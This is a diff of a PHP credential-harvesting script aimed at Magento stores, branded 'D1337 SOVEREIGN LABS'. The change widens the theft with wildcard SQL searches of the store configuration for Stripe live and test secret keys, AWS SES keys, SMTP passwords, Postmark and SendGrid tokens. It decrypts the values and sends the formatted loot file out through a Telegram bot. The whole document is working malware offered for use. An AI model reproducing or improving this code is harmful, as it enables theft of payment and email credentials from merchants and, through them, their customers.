@@ -266,74 +266,104 @@ if (isset($_SERVER['SERVER_ADDR'])) $server_ip = $_SERVER['SERVER_ADDR'];
 send_telegram("🔍 <b>Credential Harvester Started</b>\nHost: $host_name\nIP: $server_ip");
 
 // ============================================
-// HARVEST CREDENTIALS
+// HARVEST CREDENTIALS (DYNAMIC SEARCH)
 // ============================================
 $results = [];
 
-// Query core_config_data for sensitive paths
-$paths_to_check = [
-    // Stripe
-    'payment/stripe_payments_basic/stripe_mode' => 'Stripe Mode',
-    'payment/stripe_payments_basic/stripe_test_pk' => 'Stripe Test PK',
-    'payment/stripe_payments_basic/stripe_test_sk' => 'Stripe Test SK',
-    'payment/stripe_payments_basic/stripe_live_pk' => 'Stripe Live PK',
-    'payment/stripe_payments_basic/stripe_live_sk' => 'Stripe Live SK',
-    'payment/stripe_payments/stripe_mode' => 'Stripe Mode (Alt)',
-    'payment/stripe_payments/live_pk' => 'Stripe Live PK (Alt)',
-    'payment/stripe_payments/live_sk' => 'Stripe Live SK (Alt)',
+// Dynamic search queries for maximum precision
+$search_queries = [
+    // Stripe Keys
+    "SELECT path, value, 'Stripe' as category FROM " . $prefix . "core_config_data 
+     WHERE path LIKE '%stripe%' 
+        OR path LIKE '%sk_live%' 
+        OR path LIKE '%pk_live%' 
+        OR value LIKE 'sk_live_%' 
+        OR value LIKE 'pk_live_%'
+        OR value LIKE 'sk_test_%' 
+        OR value LIKE 'pk_test_%'",
     
-    // AWS SES
-    'system/smtp/aws_ses_access_key' => 'AWS SES Access Key',
-    'system/smtp/aws_ses_secret_key' => 'AWS SES Secret Key',
-    'system/smtp/aws_ses_region' => 'AWS SES Region',
-    'system/smtp/host' => 'SMTP Host',
-    'system/smtp/username' => 'SMTP Username',
-    'system/smtp/password' => 'SMTP Password',
-    'smtp/general/username' => 'SMTP Username (Alt)',
-    'smtp/general/password' => 'SMTP Password (Alt)',
-    'smtp/configuration_option' => 'SMTP Config Type',
+    // AWS SES / SMTP (more specific)
+    "SELECT path, value, 'AWS_SES' as category FROM " . $prefix . "core_config_data 
+     WHERE (path LIKE '%smtp%' AND (path LIKE '%host%' OR path LIKE '%username%' OR path LIKE '%password%' OR path LIKE '%auth%' OR path LIKE '%port%'))
+        OR path LIKE '%aws%' 
+        OR path LIKE '%ses%access%'
+        OR path LIKE '%ses%secret%'
+        OR path LIKE '%ses%region%'
+        OR value LIKE 'AKIA%'
+        OR value LIKE '%smtp.%'
+        OR value LIKE '%mail.%'",
     
     // Postmark
-    'system/smtp/postmark_api_token' => 'Postmark API Token',
-    'postmark/api_token' => 'Postmark Token',
+    "SELECT path, value, 'Postmark' as category FROM " . $prefix . "core_config_data 
+     WHERE path LIKE '%postmark%' 
+        OR value LIKE '%postmarkapp.com%'",
     
     // SendGrid
-    'system/smtp/sendgrid_api_key' => 'SendGrid API Key',
-    'sendgrid/api_key' => 'SendGrid Key',
-    'system/smtp/sendgrid_username' => 'SendGrid Username',
-    
-    // Generic SMTP
-    'system/smtp/disable' => 'SMTP Status',
-    'system/smtp/port' => 'SMTP Port',
-    'system/smtp/auth' => 'SMTP Auth Type',
+    "SELECT path, value, 'SendGrid' as category FROM " . $prefix . "core_config_data 
+     WHERE path LIKE '%sendgrid%' 
+        OR value LIKE 'SG.%'
+        OR value LIKE '%sendgrid.net%'",
 ];
 
-$sql = "SELECT path, value FROM " . $prefix . "core_config_data WHERE path IN (" . 
-       implode(',', array_fill(0, count($paths_to_check), '?')) . ")";
+$all_rows = [];
+foreach ($search_queries as $query) {
+    try {
+        $stmt = $pdo->query($query);
+        $rows = $stmt->fetchAll();
+        $all_rows = array_merge($all_rows, $rows);
+    } catch (Exception $e) {
+        echo "Query failed: " . $e->getMessage() . "\n";
+    }
+}
 
-$stmt = $pdo->prepare($sql);
-$stmt->execute(array_keys($paths_to_check));
-$rows = $stmt->fetchAll();
+// Remove duplicates based on path
+$unique_rows = [];
+$seen_paths = [];
+foreach ($all_rows as $row) {
+    if (!isset($seen_paths[$row['path']])) {
+        $unique_rows[] = $row;
+        $seen_paths[$row['path']] = true;
+    }
+}
 
-echo "Found " . count($rows) . " config entries.\n";
+echo "Found " . count($unique_rows) . " config entries.\n";
 
-foreach ($rows as $row) {
+foreach ($unique_rows as $row) {
     $path = $row['path'];
     $value = $row['value'];
-    $label = $paths_to_check[$path] ?? $path;
+    $category = $row['category'] ?? 'Unknown';
     
     if (!$value) continue;
     
+    // Auto-detect label from path
+    $path_parts = explode('/', $path);
+    $label = end($path_parts);
+    $label = str_replace('_', ' ', $label);
+    $label = ucwords($label);
+    
     // Try to decrypt
     $decrypted = smart_decrypt($value, $keys);
+    
+    // Clean up binary/garbled output
+    if ($decrypted && !mb_check_encoding($decrypted, 'UTF-8')) {
+        if (strlen($decrypted) < 10 || !ctype_print(str_replace([' ', "\t", "\n", "\r"], '', $decrypted))) {
+            $decrypted = $value;
+        }
+    }
+    
+    // If decrypted value looks like encrypted format, use original
+    if ($decrypted !== $value && strpos($decrypted, ':') !== false && !preg_match('/^[a-zA-Z0-9_\-\.@]+/', $decrypted)) {
+        $decrypted = $value;
+    }
     
     // Store result
     $results[] = [
         'label' => $label,
         'path' => $path,
+        'category' => $category,
         'raw' => $value,
         'decrypted' => $decrypted,
-        'is_encrypted' => ($decrypted !== $value)
+        'is_encrypted' => ($decrypted !== $value && strpos($value, ':') !== false)
     ];
 }
 
@@ -341,9 +371,10 @@ foreach ($rows as $row) {
 // FORMAT AND SEND RESULTS
 // ============================================
 $output = "";
-$output .= "╔══════════════════════════════════════════╗\n";
-$output .= "║  MAGENTO CREDENTIAL HARVEST RESULTS      ║\n";
-$output .= "╚══════════════════════════════════════════╝\n\n";
+$output .= str_repeat("=", 60) . "\n";
+$output .= "  MAGENTO CREDENTIAL HARVEST RESULTS\n";
+$output .= "  D1337 SOVEREIGN LABS\n";
+$output .= str_repeat("=", 60) . "\n\n";
 $output .= "Host: $host_name\n";
 $output .= "IP: $server_ip\n";
 $output .= "Date: " . date('Y-m-d H:i:s') . "\n\n";
@@ -358,75 +389,154 @@ $smtp_generic = [];
 
 foreach ($results as $r) {
     $val = $r['decrypted'];
-    $label = $r['label'];
+    $category = $r['category'];
+    $path = $r['path'];
     
-    // Categorize
-    if (strpos($label, 'Stripe') !== false) {
+    // Categorize by query category and value patterns
+    if ($category === 'Stripe' || strpos($val, 'sk_') === 0 || strpos($val, 'pk_') === 0) {
         $stripe_keys[] = $r;
-    } elseif (strpos($label, 'AWS') !== false || strpos($label, 'SES') !== false) {
+    } elseif ($category === 'AWS_SES' || strpos($val, 'AKIA') === 0 || strpos($path, 'aws') !== false || strpos($path, 'ses') !== false) {
         $aws_ses[] = $r;
-    } elseif (strpos($label, 'Postmark') !== false) {
+    } elseif ($category === 'Postmark' || strpos($val, 'postmark') !== false || strpos($path, 'postmark') !== false) {
         $postmark[] = $r;
-    } elseif (strpos($label, 'SendGrid') !== false) {
+    } elseif ($category === 'SendGrid' || strpos($val, 'SG.') === 0 || strpos($path, 'sendgrid') !== false) {
         $sendgrid[] = $r;
     } else {
-        $smtp_generic[] = $r;
+        // Generic SMTP (mail/smtp configs that don't match above)
+        if (strpos($path, 'smtp') !== false || strpos($path, 'mail') !== false) {
+            $smtp_generic[] = $r;
+        }
     }
 }
 
 // Format Stripe
 if (!empty($stripe_keys)) {
-    $output .= "🔷 STRIPE KEYS\n";
+    $output .= "[STRIPE KEYS]\n";
     $output .= str_repeat("-", 60) . "\n";
     foreach ($stripe_keys as $r) {
-        $output .= $r['label'] . ": " . $r['decrypted'] . "\n";
-        if ($r['is_encrypted']) $output .= "  (Encrypted: " . substr($r['raw'], 0, 50) . "...)\n";
+        $val = $r['decrypted'];
+        // Only show if it's a valid looking value
+        if (strlen($val) > 3 && (strpos($val, 'sk_') === 0 || strpos($val, 'pk_') === 0 || in_array($val, ['test', 'live']))) {
+            $output .= sprintf("%-20s: %s\n", $r['label'], $val);
+        }
     }
     $output .= "\n";
 }
 
-// Format AWS SES
+// Format AWS SES / SMTP
 if (!empty($aws_ses)) {
-    $output .= "☁️ AWS SES CREDENTIALS\n";
+    $output .= "[SMTP / AWS SES CREDENTIALS]\n";
     $output .= str_repeat("-", 60) . "\n";
+    
+    // Group credentials by type
+    $smtp_config = [
+        'host' => '',
+        'port' => '',
+        'username' => '',
+        'password' => '',
+        'from_email' => '',
+        'authentication' => '',
+        'aws_access_key' => '',
+        'aws_secret_key' => '',
+        'aws_region' => ''
+    ];
+    
+    // Filter and extract actual credentials
+    $smtp_keys = ['host', 'username', 'password', 'port', 'authentication', 'auth', 
+                  'aws', 'ses', 'access_key', 'secret_key', 'region', 'smtp_'];
+    
     foreach ($aws_ses as $r) {
-        $output .= $r['label'] . ": " . $r['decrypted'] . "\n";
-        if ($r['is_encrypted']) $output .= "  (Encrypted: " . substr($r['raw'], 0, 50) . "...)\n";
+        $val = $r['decrypted'];
+        $path = strtolower($r['path']);
+        $label = strtolower($r['label']);
+        
+        // Map to config structure
+        if (strpos($path, 'host') !== false || strpos($label, 'host') !== false) {
+            $smtp_config['host'] = $val;
+        } elseif (strpos($path, 'port') !== false || strpos($label, 'port') !== false) {
+            $smtp_config['port'] = $val;
+        } elseif (strpos($path, 'username') !== false || strpos($label, 'username') !== false) {
+            $smtp_config['username'] = $val;
+        } elseif (strpos($path, 'password') !== false || strpos($label, 'password') !== false) {
+            $smtp_config['password'] = $val;
+        } elseif ((strpos($path, 'from') !== false || strpos($path, 'ident_general/email') !== false) && strpos($val, '@') !== false) {
+            if (!$smtp_config['from_email']) { // Only set if not already set
+                $smtp_config['from_email'] = $val;
+            }
+        } elseif (strpos($path, 'authentication') !== false || strpos($path, 'auth') !== false) {
+            $smtp_config['authentication'] = $val;
+        } elseif (strpos($path, 'access_key') !== false || strpos($val, 'AKIA') === 0) {
+            $smtp_config['aws_access_key'] = $val;
+        } elseif (strpos($path, 'secret_key') !== false) {
+            $smtp_config['aws_secret_key'] = $val;
+        } elseif (strpos($path, 'region') !== false && strpos($path, 'aws') !== false) {
+            $smtp_config['aws_region'] = $val;
+        }
     }
+    
+    // Output grouped config
+    if ($smtp_config['host']) {
+        $output .= sprintf("%-20s: %s\n", "Host", $smtp_config['host']);
+    }
+    if ($smtp_config['port']) {
+        $output .= sprintf("%-20s: %s\n", "Port", $smtp_config['port']);
+    }
+    if ($smtp_config['username']) {
+        $output .= sprintf("%-20s: %s\n", "Username", $smtp_config['username']);
+    }
+    if ($smtp_config['password']) {
+        $output .= sprintf("%-20s: %s\n", "Password", $smtp_config['password']);
+    }
+    if ($smtp_config['from_email']) {
+        $output .= sprintf("%-20s: %s\n", "From Email", $smtp_config['from_email']);
+    }
+    if ($smtp_config['authentication']) {
+        $output .= sprintf("%-20s: %s\n", "Authentication", $smtp_config['authentication']);
+    }
+    
+    // AWS SES if present
+    if ($smtp_config['aws_access_key']) {
+        $output .= "\n";
+        $output .= sprintf("%-20s: %s\n", "AWS Access Key", $smtp_config['aws_access_key']);
+    }
+    if ($smtp_config['aws_secret_key']) {
+        $output .= sprintf("%-20s: %s\n", "AWS Secret Key", $smtp_config['aws_secret_key']);
+    }
+    if ($smtp_config['aws_region']) {
+        $output .= sprintf("%-20s: %s\n", "AWS Region", $smtp_config['aws_region']);
+    }
+    
     $output .= "\n";
 }
 
 // Format Postmark
 if (!empty($postmark)) {
-    $output .= "📮 POSTMARK SMTP\n";
+    $output .= "[POSTMARK SMTP]\n";
     $output .= str_repeat("-", 60) . "\n";
     foreach ($postmark as $r) {
-        $output .= $r['label'] . ": " . $r['decrypted'] . "\n";
-        if ($r['is_encrypted']) $output .= "  (Encrypted: " . substr($r['raw'], 0, 50) . "...)\n";
+        $val = $r['decrypted'];
+        if (strlen($val) > 2) {
+            $output .= sprintf("%-20s: %s\n", $r['label'], $val);
+        }
     }
     $output .= "\n";
 }
 
 // Format SendGrid
 if (!empty($sendgrid)) {
-    $output .= "📧 SENDGRID SMTP\n";
+    $output .= "[SENDGRID SMTP]\n";
     $output .= str_repeat("-", 60) . "\n";
     foreach ($sendgrid as $r) {
-        $output .= $r['label'] . ": " . $r['decrypted'] . "\n";
-        if ($r['is_encrypted']) $output .= "  (Encrypted: " . substr($r['raw'], 0, 50) . "...)\n";
+        $val = $r['decrypted'];
+        if (strlen($val) > 2) {
+            $output .= sprintf("%-20s: %s\n", $r['label'], $val);
+        }
     }
     $output .= "\n";
 }
 
-// Format Generic SMTP
-if (!empty($smtp_generic)) {
-    $output .= "📬 GENERIC SMTP CONFIG\n";
-    $output .= str_repeat("-", 60) . "\n";
-    foreach ($smtp_generic as $r) {
-        $output .= $r['label'] . ": " . $r['decrypted'] . "\n";
-    }
-    $output .= "\n";
-}
+// Format Generic SMTP (already included in AWS SES section above)
+// Removed to avoid duplication
 
 if (empty($results)) {
     $output .= "⚠️ No credentials found in database.\n\n";
@@ -443,7 +553,7 @@ file_put_contents($outFile, $output);
 echo $output;
 
 // Send to Telegram
-send_telegram("✅ <b>Scan Complete</b>\n\nHost: $host_name\nFound: " . count($results) . " entries", $outFile);
+send_telegram("✅ <b>Credential Harvest Complete</b>\n\nHost: $host_name\nFound: " . count($results) . " entries", $outFile);
 
 echo "\nSaved to: $outFile\n";
 echo "Sent to Telegram!\n";
